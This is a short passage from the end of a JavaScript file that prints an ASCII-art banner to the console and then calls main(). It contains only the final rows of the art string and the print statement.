  \\/\\_____\\  \\ \\_\\\\"\\_\\  \\ \\_\\  \\ \\_\\    \\/\\_____\\  \\ \\_\\    \\ \\_____\\  \\ \\_\\ \\ \\_\\  \\ \\_\\    \\/\\_____\\ 
   \\/_____/   \\/_/ \\/_/   \\/_/   \\/_/     \\/_____/   \\/_/     \\/_____/   \\/_/  \\/_/   \\/_/     \\/_____/ 
                                                                                                         
`;

    console.log(art);
}

main();
